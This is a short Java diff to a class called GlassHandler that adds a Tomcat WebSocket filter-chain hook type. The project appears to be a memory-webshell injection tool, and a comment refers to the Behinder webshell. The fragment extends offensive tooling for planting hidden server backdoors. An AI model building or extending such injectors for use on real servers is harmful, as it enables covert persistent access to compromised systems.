@@ -207,6 +207,8 @@ public class GlassHandler {
 			insertInitHookClassINFORMATION(classModifier, BasicServletHook);
 		} else if (hookType.equals("Filter")) {
 			insertInitHookClassINFORMATION(classModifier, TomcatFilterChainHook);
+		} else if (hookType.equals("WsFilter")) {
+			insertInitHookClassINFORMATION(classModifier, TomcatWsFilterChainHook);
 		}
 
 		// 如果是冰蝎逻辑
